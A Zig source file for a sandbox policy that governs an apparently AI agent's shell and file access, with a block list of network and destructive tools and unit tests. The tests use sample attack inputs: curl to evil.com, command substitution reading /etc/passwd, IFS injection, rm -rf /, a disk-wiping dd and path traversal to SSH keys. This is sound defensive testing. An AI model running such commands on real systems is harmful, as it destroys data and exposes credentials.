const std = @import("std");

/// How much autonomy the agent has
pub const AutonomyLevel = enum {
    /// Read-only: can observe but not act
    read_only,
    /// Supervised: acts but requires approval for risky operations
    supervised,
    /// Full: autonomous execution within policy bounds
    full,

    pub fn default() AutonomyLevel {
        return .supervised;
    }

    pub fn toString(self: AutonomyLevel) []const u8 {
        return switch (self) {
            .read_only => "readonly",
            .supervised => "supervised",
            .full => "full",
        };
    }

    pub fn fromString(s: []const u8) ?AutonomyLevel {
        if (std.mem.eql(u8, s, "readonly") or std.mem.eql(u8, s, "read_only")) return .read_only;
        if (std.mem.eql(u8, s, "supervised")) return .supervised;
        if (std.mem.eql(u8, s, "full")) return .full;
        return null;
    }
};

/// Risk score for shell command execution.
pub const CommandRiskLevel = enum {
    low,
    medium,
    high,

    pub fn toString(self: CommandRiskLevel) []const u8 {
        return switch (self) {
            .low => "low",
            .medium => "medium",
            .high => "high",
        };
    }
};

/// Sliding-window action tracker for rate limiting.
/// Records timestamps of actions and prunes entries older than 1 hour.
pub const ActionTracker = struct {
    /// Timestamps of recent actions in nanoseconds (monotonic clock)
    actions: std.ArrayList(i128) = .empty,
    allocator: std.mem.Allocator,
    /// Window duration in nanoseconds (1 hour)
    const WINDOW_NS: i128 = 3600 * std.time.ns_per_s;

    pub fn init(allocator: std.mem.Allocator) ActionTracker {
        return .{
            .allocator = allocator,
        };
    }

    pub fn deinit(self: *ActionTracker) void {
        self.actions.deinit(self.allocator);
    }

    /// Record an action and return the current count within the window.
    pub fn record(self: *ActionTracker) !usize {
        self.prune();
        try self.actions.append(self.allocator, std.time.nanoTimestamp());
        return self.actions.items.len;
    }

    /// Count of actions in the current window without recording.
    pub fn count(self: *ActionTracker) usize {
        self.prune();
        return self.actions.items.len;
    }

    /// Clone this tracker (creates independent copy)
    pub fn clone(self: *const ActionTracker) !ActionTracker {
        return .{
            .actions = try self.actions.clone(self.allocator),
            .allocator = self.allocator,
        };
    }

    fn prune(self: *ActionTracker) void {
        const now = std.time.nanoTimestamp();
        const cutoff = now - WINDOW_NS;
        // Remove entries older than the window
        var write_idx: usize = 0;
        for (self.actions.items) |ts| {
            if (ts > cutoff) {
                self.actions.items[write_idx] = ts;
                write_idx += 1;
            }
        }
        self.actions.shrinkRetainingCapacity(write_idx);
    }
};

/// High-risk commands that are always blocked/require elevated approval.
const high_risk_commands = [_][]const u8{
    "rm",       "mkfs",         "dd",     "shutdown", "reboot", "halt",
    "poweroff", "sudo",         "su",     "chown",    "chmod",  "useradd",
    "userdel",  "usermod",      "passwd", "mount",    "umount", "iptables",
    "ufw",      "firewall-cmd", "curl",   "wget",     "nc",     "ncat",
    "netcat",   "scp",          "ssh",    "ftp",      "telnet",
};

/// Default allowed commands
pub const default_allowed_commands = [_][]const u8{
    "git", "npm", "cargo", "ls", "cat", "grep", "find", "echo", "pwd", "wc", "head", "tail",
};

/// Default forbidden paths
pub const default_forbidden_paths = [_][]const u8{
    "/etc",     "/root",  "/home",     "/usr",  "/bin",
    "/sbin",    "/lib",   "/opt",      "/boot", "/dev",
    "/proc",    "/sys",   "/var",      "/tmp",  "~/.ssh",
    "~/.gnupg", "~/.aws", "~/.config",
};

/// Security policy enforced on all tool executions
pub const SecurityPolicy = struct {
    autonomy: AutonomyLevel = .supervised,
    workspace_dir: []const u8 = ".",
    workspace_only: bool = true,
    allowed_commands: []const []const u8 = &default_allowed_commands,
    forbidden_paths: []const []const u8 = &default_forbidden_paths,
    max_actions_per_hour: u32 = 20,
    max_cost_per_day_cents: u32 = 500,
    require_approval_for_medium_risk: bool = true,
    block_high_risk_commands: bool = true,
    tracker: ?*ActionTracker = null,

    /// Classify command risk level.
    pub fn commandRiskLevel(self: *const SecurityPolicy, command: []const u8) CommandRiskLevel {
        _ = self;
        // Normalize separators to null bytes for segment splitting
        var normalized: [4096]u8 = undefined;
        const norm_len = normalizeCommand(command, &normalized);
        const norm = normalized[0..norm_len];

        var saw_medium = false;
        var iter = std.mem.splitScalar(u8, norm, 0);
        while (iter.next()) |raw_segment| {
            const segment = std.mem.trim(u8, raw_segment, " \t");
            if (segment.len == 0) continue;

            const cmd_part = skipEnvAssignments(segment);
            var words = std.mem.tokenizeScalar(u8, cmd_part, ' ');
            const base_raw = words.next() orelse continue;

            // Extract basename (after last '/')
            const base = extractBasename(base_raw);
            const lower_base = lowerBuf(base);
            const joined_lower = lowerBuf(cmd_part);

            // High-risk commands
            if (isHighRiskCommand(lower_base.slice())) return .high;

            // Check for destructive patterns
            if (containsStr(joined_lower.slice(), "rm -rf /") or
                containsStr(joined_lower.slice(), "rm -fr /") or
                containsStr(joined_lower.slice(), ":(){:|:&};:"))
            {
                return .high;
            }

            // Medium-risk commands
            const first_arg = words.next();
            const medium = classifyMedium(lower_base.slice(), first_arg);
            saw_medium = saw_medium or medium;
        }

        if (saw_medium) return .medium;
        return .low;
    }

    /// Validate full command execution policy (allowlist + risk gate).
    pub fn validateCommandExecution(
        self: *const SecurityPolicy,
        command: []const u8,
        approved: bool,
    ) error{ CommandNotAllowed, HighRiskBlocked, ApprovalRequired }!CommandRiskLevel {
        if (!self.isCommandAllowed(command)) {
            return error.CommandNotAllowed;
        }

        const risk = self.commandRiskLevel(command);

        if (risk == .high) {
            if (self.block_high_risk_commands) {
                return error.HighRiskBlocked;
            }
            if (self.autonomy == .supervised and !approved) {
                return error.ApprovalRequired;
            }
        }

        if (risk == .medium and
            self.autonomy == .supervised and
            self.require_approval_for_medium_risk and
            !approved)
        {
            return error.ApprovalRequired;
        }

        return risk;
    }

    /// Check if a shell command is allowed.
    pub fn isCommandAllowed(self: *const SecurityPolicy, command: []const u8) bool {
        if (self.autonomy == .read_only) return false;

        // Block subshell/expansion operators
        if (containsStr(command, "`") or containsStr(command, "$(") or containsStr(command, "${")) {
            return false;
        }

        // Block output redirections
        if (std.mem.indexOfScalar(u8, command, '>') != null) return false;

        var normalized: [4096]u8 = undefined;
        const norm_len = normalizeCommand(command, &normalized);
        const norm = normalized[0..norm_len];

        var has_cmd = false;
        var iter = std.mem.splitScalar(u8, norm, 0);
        while (iter.next()) |raw_segment| {
            const segment = std.mem.trim(u8, raw_segment, " \t");
            if (segment.len == 0) continue;

            const cmd_part = skipEnvAssignments(segment);
            var words = std.mem.tokenizeScalar(u8, cmd_part, ' ');
            const first_word = words.next() orelse continue;
            if (first_word.len == 0) continue;

            const base_cmd = extractBasename(first_word);
            if (base_cmd.len == 0) continue;

            has_cmd = true;

            var found = false;
            for (self.allowed_commands) |allowed| {
                if (std.mem.eql(u8, allowed, base_cmd)) {
                    found = true;
                    break;
                }
            }
            if (!found) return false;
        }

        return has_cmd;
    }

    /// Check if a file path is allowed (no path traversal, within workspace)
    pub fn isPathAllowed(self: *const SecurityPolicy, path: []const u8) bool {
        // Block null bytes
        if (std.mem.indexOfScalar(u8, path, 0) != null) return false;

        // Block path traversal: ".." as a path component
        if (hasParentDirComponent(path)) return false;

        // Block URL-encoded traversal
        var lower_buf: [4096]u8 = undefined;
        const lower = toLowerSlice(path, &lower_buf);
        if (containsStr(lower, "..%2f") or containsStr(lower, "%2f..")) return false;

        // Expand tilde
        var expanded_buf: [4096]u8 = undefined;
        const expanded = expandTilde(path, &expanded_buf);

        // Block absolute paths when workspace_only is set
        if (self.workspace_only and expanded.len > 0 and expanded[0] == '/') return false;

        // Block forbidden paths
        for (self.forbidden_paths) |forbidden| {
            var fb_buf: [4096]u8 = undefined;
            const forbidden_expanded = expandTilde(forbidden, &fb_buf);
            if (pathStartsWith(expanded, forbidden_expanded)) return false;
        }

        return true;
    }

    /// Check if autonomy level permits any action at all
    pub fn canAct(self: *const SecurityPolicy) bool {
        return self.autonomy != .read_only;
    }

    /// Record an action and check if the rate limit has been exceeded.
    /// Returns true if the action is allowed, false if rate-limited.
    pub fn recordAction(self: *const SecurityPolicy) !bool {
        if (self.tracker) |tracker| {
            const action_count = try tracker.record();
            return action_count <= self.max_actions_per_hour;
        }
        return true;
    }

    /// Check if the rate limit would be exceeded without recording.
    pub fn isRateLimited(self: *const SecurityPolicy) bool {
        if (self.tracker) |tracker| {
            return tracker.count() >= self.max_actions_per_hour;
        }
        return false;
    }
};

// ── Internal helpers ──────────────────────────────────────────────────

/// Normalize command by replacing separators with null bytes
fn normalizeCommand(command: []const u8, buf: []u8) usize {
    const len = @min(command.len, buf.len);
    @memcpy(buf[0..len], command[0..len]);
    const result = buf[0..len];

    // Replace "&&" and "||" with "\x00\x00"
    replacePair(result, "&&");
    replacePair(result, "||");

    // Replace single separators
    for (result) |*c| {
        if (c.* == '\n' or c.* == ';' or c.* == '|') c.* = 0;
    }
    return len;
}

fn replacePair(buf: []u8, pat: *const [2]u8) void {
    if (buf.len < 2) return;
    var i: usize = 0;
    while (i < buf.len - 1) : (i += 1) {
        if (buf[i] == pat[0] and buf[i + 1] == pat[1]) {
            buf[i] = 0;
            buf[i + 1] = 0;
            i += 1;
        }
    }
}

/// Skip leading environment variable assignments (e.g. `FOO=bar cmd args`)
fn skipEnvAssignments(s: []const u8) []const u8 {
    var rest = s;
    while (true) {
        const trimmed = std.mem.trim(u8, rest, " \t");
        if (trimmed.len == 0) return rest;

        // Find end of first word
        const word_end = std.mem.indexOfAny(u8, trimmed, " \t") orelse trimmed.len;
        const word = trimmed[0..word_end];

        // Check if it's an env assignment
        if (std.mem.indexOfScalar(u8, word, '=')) |_| {
            // Must start with letter or underscore
            if (word.len > 0 and (std.ascii.isAlphabetic(word[0]) or word[0] == '_')) {
                rest = if (word_end < trimmed.len) trimmed[word_end..] else "";
                continue;
            }
        }
        return trimmed;
    }
}

/// Extract basename from a path (everything after last '/')
fn extractBasename(path: []const u8) []const u8 {
    if (std.mem.lastIndexOfScalar(u8, path, '/')) |idx| {
        return path[idx + 1 ..];
    }
    return path;
}

/// Check if a command basename is in the high-risk set
fn isHighRiskCommand(base: []const u8) bool {
    for (&high_risk_commands) |cmd| {
        if (std.mem.eql(u8, base, cmd)) return true;
    }
    return false;
}

/// Classify whether a command is medium-risk based on its name and first argument
fn classifyMedium(base: []const u8, first_arg_raw: ?[]const u8) bool {
    const first_arg = if (first_arg_raw) |a| lowerBuf(a).slice() else "";

    if (std.mem.eql(u8, base, "git")) {
        return isGitMediumVerb(first_arg);
    }
    if (std.mem.eql(u8, base, "npm") or std.mem.eql(u8, base, "pnpm") or std.mem.eql(u8, base, "yarn")) {
        return isNpmMediumVerb(first_arg);
    }
    if (std.mem.eql(u8, base, "cargo")) {
        return isCargoMediumVerb(first_arg);
    }
    if (std.mem.eql(u8, base, "touch") or std.mem.eql(u8, base, "mkdir") or
        std.mem.eql(u8, base, "mv") or std.mem.eql(u8, base, "cp") or
        std.mem.eql(u8, base, "ln"))
    {
        return true;
    }
    return false;
}

fn isGitMediumVerb(verb: []const u8) bool {
    const verbs = [_][]const u8{
        "commit",      "push",   "reset",  "clean",    "rebase", "merge",
        "cherry-pick", "revert", "branch", "checkout", "switch", "tag",
    };
    for (&verbs) |v| {
        if (std.mem.eql(u8, verb, v)) return true;
    }
    return false;
}

fn isNpmMediumVerb(verb: []const u8) bool {
    const verbs = [_][]const u8{
        "install", "add", "remove", "uninstall", "update", "publish",
    };
    for (&verbs) |v| {
        if (std.mem.eql(u8, verb, v)) return true;
    }
    return false;
}

fn isCargoMediumVerb(verb: []const u8) bool {
    const verbs = [_][]const u8{
        "add", "remove", "install", "clean", "publish",
    };
    for (&verbs) |v| {
        if (std.mem.eql(u8, verb, v)) return true;
    }
    return false;
}

/// Check if a path has ".." as a component
fn hasParentDirComponent(path: []const u8) bool {
    var iter = std.mem.splitScalar(u8, path, '/');
    while (iter.next()) |component| {
        if (std.mem.eql(u8, component, "..")) return true;
    }
    return false;
}

/// Expand ~ to HOME env var
fn expandTilde(path: []const u8, buf: []u8) []const u8 {
    if (path.len >= 2 and path[0] == '~' and path[1] == '/') {
        if (std.posix.getenv("HOME")) |home| {
            const rest = path[1..]; // includes the '/'
            const total = home.len + rest.len;
            if (total <= buf.len) {
                @memcpy(buf[0..home.len], home);
                @memcpy(buf[home.len..][0..rest.len], rest);
                return buf[0..total];
            }
        }
    }
    return path;
}

/// Check if path starts with prefix (path-component-aware)
fn pathStartsWith(path: []const u8, prefix: []const u8) bool {
    if (prefix.len == 0) return false;
    if (path.len < prefix.len) return false;
    if (!std.mem.eql(u8, path[0..prefix.len], prefix)) return false;
    // Must match at component boundary
    if (path.len == prefix.len) return true;
    return path[prefix.len] == '/';
}

fn containsStr(haystack: []const u8, needle: []const u8) bool {
    return std.mem.indexOf(u8, haystack, needle) != null;
}

/// Fixed-size buffer for lowercase conversion
const LowerResult = struct {
    buf: [4096]u8 = undefined,
    len: usize = 0,

    pub fn slice(self: *const LowerResult) []const u8 {
        return self.buf[0..self.len];
    }
};

fn lowerBuf(s: []const u8) LowerResult {
    var result = LowerResult{};
    result.len = @min(s.len, result.buf.len);
    for (s[0..result.len], 0..) |c, i| {
        result.buf[i] = std.ascii.toLower(c);
    }
    return result;
}

fn toLowerSlice(s: []const u8, buf: []u8) []const u8 {
    const len = @min(s.len, buf.len);
    for (s[0..len], 0..) |c, i| {
        buf[i] = std.ascii.toLower(c);
    }
    return buf[0..len];
}

// ── Tests ──────────────────────────────────────────────────────────────

test "autonomy default is supervised" {
    try std.testing.expectEqual(AutonomyLevel.supervised, AutonomyLevel.default());
}

test "autonomy toString roundtrip" {
    try std.testing.expectEqualStrings("full", AutonomyLevel.full.toString());
    try std.testing.expectEqual(AutonomyLevel.read_only, AutonomyLevel.fromString("readonly").?);
    try std.testing.expectEqual(AutonomyLevel.supervised, AutonomyLevel.fromString("supervised").?);
    try std.testing.expectEqual(AutonomyLevel.full, AutonomyLevel.fromString("full").?);
}

test "can act readonly false" {
    const p = SecurityPolicy{ .autonomy = .read_only };
    try std.testing.expect(!p.canAct());
}

test "can act supervised true" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.canAct());
}

test "can act full true" {
    const p = SecurityPolicy{ .autonomy = .full };
    try std.testing.expect(p.canAct());
}

test "allowed commands basic" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isCommandAllowed("ls"));
    try std.testing.expect(p.isCommandAllowed("git status"));
    try std.testing.expect(p.isCommandAllowed("cargo build --release"));
    try std.testing.expect(p.isCommandAllowed("cat file.txt"));
    try std.testing.expect(p.isCommandAllowed("grep -r pattern ."));
}

test "blocked commands basic" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("rm -rf /"));
    try std.testing.expect(!p.isCommandAllowed("sudo apt install"));
    try std.testing.expect(!p.isCommandAllowed("curl http://evil.com"));
    try std.testing.expect(!p.isCommandAllowed("wget http://evil.com"));
    try std.testing.expect(!p.isCommandAllowed("python3 exploit.py"));
    try std.testing.expect(!p.isCommandAllowed("node malicious.js"));
}

test "readonly blocks all commands" {
    const p = SecurityPolicy{ .autonomy = .read_only };
    try std.testing.expect(!p.isCommandAllowed("ls"));
    try std.testing.expect(!p.isCommandAllowed("cat file.txt"));
    try std.testing.expect(!p.isCommandAllowed("echo hello"));
}

test "command with absolute path extracts basename" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isCommandAllowed("/usr/bin/git status"));
    try std.testing.expect(p.isCommandAllowed("/bin/ls -la"));
}

test "empty command blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed(""));
    try std.testing.expect(!p.isCommandAllowed("   "));
}

test "command with pipes validates all segments" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isCommandAllowed("ls | grep foo"));
    try std.testing.expect(p.isCommandAllowed("cat file.txt | wc -l"));
    try std.testing.expect(!p.isCommandAllowed("ls | curl http://evil.com"));
    try std.testing.expect(!p.isCommandAllowed("echo hello | python3 -"));
}

test "command injection semicolon blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("ls; rm -rf /"));
    try std.testing.expect(!p.isCommandAllowed("ls;rm -rf /"));
}

test "command injection backtick blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("echo `whoami`"));
    try std.testing.expect(!p.isCommandAllowed("echo `rm -rf /`"));
}

test "command injection dollar paren blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("echo $(cat /etc/passwd)"));
    try std.testing.expect(!p.isCommandAllowed("echo $(rm -rf /)"));
}

test "command injection redirect blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("echo secret > /etc/crontab"));
    try std.testing.expect(!p.isCommandAllowed("ls >> /tmp/exfil.txt"));
}

test "command injection dollar brace blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("echo ${IFS}cat${IFS}/etc/passwd"));
}

test "command env var prefix with allowed cmd" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isCommandAllowed("FOO=bar ls"));
    try std.testing.expect(p.isCommandAllowed("LANG=C grep pattern file"));
    try std.testing.expect(!p.isCommandAllowed("FOO=bar rm -rf /"));
}

test "command and chain validates both" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("ls && rm -rf /"));
    try std.testing.expect(p.isCommandAllowed("ls && echo done"));
}

test "command or chain validates both" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("ls || rm -rf /"));
    try std.testing.expect(p.isCommandAllowed("ls || echo fallback"));
}

test "command newline injection blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("ls\nrm -rf /"));
    try std.testing.expect(p.isCommandAllowed("ls\necho hello"));
}

test "command risk low for read commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("git status"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("ls -la"));
}

test "command risk medium for mutating commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git reset --hard HEAD~1"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("touch file.txt"));
}

test "command risk high for dangerous commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("rm -rf /tmp/test"));
}

test "validate command requires approval for medium risk" {
    const allowed = [_][]const u8{"touch"};
    const p = SecurityPolicy{
        .autonomy = .supervised,
        .require_approval_for_medium_risk = true,
        .allowed_commands = &allowed,
    };

    const denied = p.validateCommandExecution("touch test.txt", false);
    try std.testing.expectError(error.ApprovalRequired, denied);

    const ok = try p.validateCommandExecution("touch test.txt", true);
    try std.testing.expectEqual(CommandRiskLevel.medium, ok);
}

test "validate command blocks high risk by default" {
    const allowed = [_][]const u8{"rm"};
    const p = SecurityPolicy{
        .autonomy = .supervised,
        .allowed_commands = &allowed,
    };
    const result = p.validateCommandExecution("rm -rf /tmp/test", true);
    try std.testing.expectError(error.HighRiskBlocked, result);
}

test "relative paths allowed" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isPathAllowed("file.txt"));
    try std.testing.expect(p.isPathAllowed("src/main.rs"));
    try std.testing.expect(p.isPathAllowed("deep/nested/dir/file.txt"));
}

test "path traversal blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isPathAllowed("../etc/passwd"));
    try std.testing.expect(!p.isPathAllowed("../../root/.ssh/id_rsa"));
    try std.testing.expect(!p.isPathAllowed("foo/../../../etc/shadow"));
    try std.testing.expect(!p.isPathAllowed(".."));
}

test "absolute paths blocked when workspace only" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isPathAllowed("/etc/passwd"));
    try std.testing.expect(!p.isPathAllowed("/root/.ssh/id_rsa"));
    try std.testing.expect(!p.isPathAllowed("/tmp/file.txt"));
}

test "absolute paths allowed when not workspace only" {
    const no_forbidden = [_][]const u8{};
    const p = SecurityPolicy{
        .workspace_only = false,
        .forbidden_paths = &no_forbidden,
    };
    try std.testing.expect(p.isPathAllowed("/tmp/file.txt"));
}

test "forbidden paths blocked" {
    const p = SecurityPolicy{ .workspace_only = false };
    try std.testing.expect(!p.isPathAllowed("/etc/passwd"));
    try std.testing.expect(!p.isPathAllowed("/root/.bashrc"));
    try std.testing.expect(!p.isPathAllowed("~/.ssh/id_rsa"));
    try std.testing.expect(!p.isPathAllowed("~/.gnupg/pubring.kbx"));
}

test "empty path allowed" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isPathAllowed(""));
}

test "dotfile in workspace allowed" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isPathAllowed(".gitignore"));
    try std.testing.expect(p.isPathAllowed(".env"));
}

test "path with null byte blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isPathAllowed("file\x00.txt"));
}

test "action tracker starts at zero" {
    var tracker = ActionTracker.init(std.testing.allocator);
    defer tracker.deinit();
    try std.testing.expectEqual(@as(usize, 0), tracker.count());
}

test "action tracker records actions" {
    var tracker = ActionTracker.init(std.testing.allocator);
    defer tracker.deinit();
    try std.testing.expectEqual(@as(usize, 1), try tracker.record());
    try std.testing.expectEqual(@as(usize, 2), try tracker.record());
    try std.testing.expectEqual(@as(usize, 3), try tracker.record());
    try std.testing.expectEqual(@as(usize, 3), tracker.count());
}

test "action tracker clone is independent" {
    var tracker = ActionTracker.init(std.testing.allocator);
    defer tracker.deinit();
    _ = try tracker.record();
    _ = try tracker.record();

    var cloned = try tracker.clone();
    defer cloned.deinit();
    try std.testing.expectEqual(@as(usize, 2), cloned.count());

    _ = try tracker.record();
    try std.testing.expectEqual(@as(usize, 3), tracker.count());
    try std.testing.expectEqual(@as(usize, 2), cloned.count());
}

test "record action allows within limit" {
    var tracker = ActionTracker.init(std.testing.allocator);
    defer tracker.deinit();
    var p = SecurityPolicy{
        .max_actions_per_hour = 5,
        .tracker = &tracker,
    };
    _ = &p;
    for (0..5) |_| {
        try std.testing.expect(try p.recordAction());
    }
}

test "record action blocks over limit" {
    var tracker = ActionTracker.init(std.testing.allocator);
    defer tracker.deinit();
    var p = SecurityPolicy{
        .max_actions_per_hour = 3,
        .tracker = &tracker,
    };
    _ = &p;
    try std.testing.expect(try p.recordAction()); // 1
    try std.testing.expect(try p.recordAction()); // 2
    try std.testing.expect(try p.recordAction()); // 3
    try std.testing.expect(!try p.recordAction()); // 4 — over limit
}

test "is rate limited reflects count" {
    var tracker = ActionTracker.init(std.testing.allocator);
    defer tracker.deinit();
    var p = SecurityPolicy{
        .max_actions_per_hour = 2,
        .tracker = &tracker,
    };
    _ = &p;
    try std.testing.expect(!p.isRateLimited());
    _ = try p.recordAction();
    try std.testing.expect(!p.isRateLimited());
    _ = try p.recordAction();
    try std.testing.expect(p.isRateLimited());
}

test "default policy has sane values" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(AutonomyLevel.supervised, p.autonomy);
    try std.testing.expect(p.workspace_only);
    try std.testing.expect(p.allowed_commands.len > 0);
    try std.testing.expect(p.forbidden_paths.len > 0);
    try std.testing.expect(p.max_actions_per_hour > 0);
    try std.testing.expect(p.max_cost_per_day_cents > 0);
    try std.testing.expect(p.require_approval_for_medium_risk);
    try std.testing.expect(p.block_high_risk_commands);
}

// ── Additional autonomy level tests ─────────────────────────────

test "autonomy fromString invalid returns null" {
    try std.testing.expect(AutonomyLevel.fromString("invalid") == null);
    try std.testing.expect(AutonomyLevel.fromString("") == null);
    try std.testing.expect(AutonomyLevel.fromString("FULL") == null);
}

test "autonomy fromString read_only alias" {
    try std.testing.expectEqual(AutonomyLevel.read_only, AutonomyLevel.fromString("read_only").?);
    try std.testing.expectEqual(AutonomyLevel.read_only, AutonomyLevel.fromString("readonly").?);
}

test "autonomy toString all levels" {
    try std.testing.expectEqualStrings("readonly", AutonomyLevel.read_only.toString());
    try std.testing.expectEqualStrings("supervised", AutonomyLevel.supervised.toString());
    try std.testing.expectEqualStrings("full", AutonomyLevel.full.toString());
}

test "command risk level toString" {
    try std.testing.expectEqualStrings("low", CommandRiskLevel.low.toString());
    try std.testing.expectEqualStrings("medium", CommandRiskLevel.medium.toString());
    try std.testing.expectEqualStrings("high", CommandRiskLevel.high.toString());
}

// ── Additional command tests ────────────────────────────────────

test "full autonomy allows all commands" {
    const p = SecurityPolicy{ .autonomy = .full };
    try std.testing.expect(p.canAct());
}

test "high risk commands list" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("sudo apt install"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("rm -rf /tmp"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("dd if=/dev/zero of=/dev/sda"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("shutdown now"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("reboot"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("curl http://evil.com"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("wget http://evil.com"));
}

test "medium risk git commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git commit -m test"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git push origin main"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git reset --hard"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git clean -fd"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git rebase main"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git merge feature"));
}

test "medium risk npm commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("npm install"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("npm publish"));
}

test "medium risk cargo commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("cargo add serde"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("cargo publish"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("cargo clean"));
}

test "medium risk filesystem commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("touch file.txt"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("mkdir dir"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("mv a b"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("cp a b"));
}

test "low risk read commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("git log"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("git diff"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("ls -la"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("cat file.txt"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("head -n 10 file"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("tail -n 10 file"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("wc -l file.txt"));
}

test "fork bomb pattern in single segment detected as high risk" {
    const p = SecurityPolicy{};
    // The normalizeCommand splits on |, ;, & so the classic fork bomb
    // gets segmented. But "rm -rf /" style destructive patterns within
    // a single segment are still caught:
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("rm -rf /"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("rm -fr /"));
}

test "rm -rf root detected as high risk" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("rm -rf /"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("rm -fr /"));
}

// ── Additional path tests ───────────────────────────────────────

test "url encoded path traversal blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isPathAllowed("..%2fetc/passwd"));
    try std.testing.expect(!p.isPathAllowed("%2f..%2fetc/passwd"));
}

test "tilde paths handled" {
    const p = SecurityPolicy{ .workspace_only = false };
    try std.testing.expect(!p.isPathAllowed("~/.ssh/id_rsa"));
    try std.testing.expect(!p.isPathAllowed("~/.gnupg/pubring.kbx"));
    try std.testing.expect(!p.isPathAllowed("~/.aws/credentials"));
    try std.testing.expect(!p.isPathAllowed("~/.config/secret"));
}

test "forbidden paths include critical system dirs" {
    const p = SecurityPolicy{ .workspace_only = false };
    try std.testing.expect(!p.isPathAllowed("/etc/shadow"));
    try std.testing.expect(!p.isPathAllowed("/proc/1/status"));
    try std.testing.expect(!p.isPathAllowed("/sys/class"));
    try std.testing.expect(!p.isPathAllowed("/boot/vmlinuz"));
    try std.testing.expect(!p.isPathAllowed("/dev/sda"));
    try std.testing.expect(!p.isPathAllowed("/var/log/syslog"));
}

test "workspace only blocks all absolute paths" {
    const p = SecurityPolicy{ .workspace_only = true };
    try std.testing.expect(!p.isPathAllowed("/any/path"));
    try std.testing.expect(!p.isPathAllowed("/home/user/file"));
}

test "nested relative paths allowed" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isPathAllowed("a/b/c/d/e.txt"));
    try std.testing.expect(p.isPathAllowed("src/security/policy.zig"));
}

// ── Validate command execution ──────────────────────────────────

test "validate command not allowed returns error" {
    const p = SecurityPolicy{};
    const result = p.validateCommandExecution("python3 exploit.py", false);
    try std.testing.expectError(error.CommandNotAllowed, result);
}

test "validate command full autonomy skips approval" {
    const allowed = [_][]const u8{"touch"};
    const p = SecurityPolicy{
        .autonomy = .full,
        .require_approval_for_medium_risk = true,
        .allowed_commands = &allowed,
    };
